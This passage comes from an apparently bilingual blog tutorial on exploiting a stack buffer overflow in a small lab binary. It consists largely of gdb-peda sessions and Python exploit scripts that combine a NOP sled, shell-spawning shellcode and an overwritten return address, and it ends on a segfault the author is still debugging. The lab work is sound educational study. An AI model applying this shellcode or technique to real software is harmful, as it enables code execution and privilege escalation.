class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run A</span><br>Starting program: /home/kali/StackOverflowtest/bol A<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd38c --&gt; 0x4f430041 (&#x27;A&#x27;)<br>EDX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd0e8 --&gt; 0x0 <br>ESP: 0xffffd070 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd070 --&gt; 0x0 <br>0004| 0xffffd074 --&gt; 0x1 <br>0008| 0xffffd078 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>0016| 0xffffd080 --&gt; 0x0 <br>0020| 0xffffd084 --&gt; 0x0 <br>0024| 0xffffd088 --&gt; 0x0 <br>0028| 0xffffd08c --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x2, argv=0xffffd1a4) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd07c          0xffffd07c<br>ecx            0xffffd38c          0xffffd38c<br>edx            0xffffd07c          0xffffd07c<br>ebx            0x804c000           0x804c000<br>esp            0xffffd070          0xffffd070<br>ebp            0xffffd0e8          0xffffd0e8<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x282               [ SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd070:     0x00000000      0x00000001      0xf7ffd9d0      0x00000041<br>0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000<br>0xffffd090:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd0a0:     0x08049060      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd0b0:     0x00000002      0xf7fdc480      0x00000000      0xf7df38ce<br>0xffffd0c0:     0xf7fa73fc      0xffffffff      0x08049060      0x0804921b<br>0xffffd0d0:     0x00000002      0xffffd1a4      0xffffd1b0      0x080491ed<br>0xffffd0e0:     0xffffd100      0x00000000      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0x08049060      0x00000000      0xf7dda905<br>0xffffd100:     0x00000002      0xffffd1a4      0xffffd1b0      0xffffd134<br></code></pre></td></tr></table></figure><h3 id="Overflowing-the-Stack-1"><a href="#Overflowing-the-Stack-1" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h3><p><strong>使用 116 个 A 进行测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p><strong>使用 112 个 A 和 4 个 B 进行测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*112+&quot;B&quot;*4)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x42424242<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>返回地址变成了 0x42424242（BBBB）</p><h2 id="Constructing-the-Exploit"><a href="#Constructing-the-Exploit" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h2><h3 id="Getshellcode"><a href="#Getshellcode" class="headerlink" title="Getshellcode"></a>Getshellcode</h3><p>For this project, I am using shellcode that spawns a “dash” shell from this page:</p><p><a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a></p><p>The shellcode used to spawn a “dash” shell is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"># This shellcode is <span class="hljs-number">32</span> bytes <span class="hljs-keyword">long</span>.<br>\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80<br></code></pre></td></tr></table></figure><h3 id="Nop"><a href="#Nop" class="headerlink" title="Nop"></a>Nop</h3><p>There are some imperfections in the debugger, so an exploit that works in gdb may fail in a real Linux shell. This happens because environment variables and other details may cause the location of the stack to change slightly.</p><p>The usual solution for this problem is a NOP Sled—a long series of “90” bytes, which do nothing when processed and proceed to the next instruction.</p><p>For this exploit, we’ll use a 64-byte NOP Sled.</p><h3 id="Constructing-the-Exploit-1"><a href="#Constructing-the-Exploit-1" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h3><p><strong>a.py：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;1234&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-in-gdb"><a href="#Testing-Exploit-in-gdb" class="headerlink" title="Testing Exploit in gdb"></a>Testing Exploit in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 a.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xw <span class="hljs-variable">$esp</span></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x34333231<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure><p>Choosing an Address and Inserting the Correct Address Into the Exploit</p><p><strong>b.py：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;\x30\xd0\xff\xff&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-2-in-gdb"><a href="#Testing-Exploit-2-in-gdb" class="headerlink" title="Testing Exploit 2 in gdb"></a>Testing Exploit 2 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure><p>继续运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure><p>它将停止的原因显示为 SIGSEGV。这意味着发生了分段违规信号，程序已停止。SIGSEGV通常称为分段故障。</p><p>应该调用一个 “/bin/dash” ，但是并没有，重新调试并一步一步查看汇编代码和运行情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 b.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>EDX: 0xffffd073 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br>Done!<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffffff <br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491bf (&lt;main+73&gt;:      nop)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>=&gt; 0x80491bf &lt;main+73&gt;: nop<br>   0x80491c0 &lt;main+74&gt;: lea    esp,[ebp-0x8]<br>   0x80491c3 &lt;main+77&gt;: pop    ecx<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main 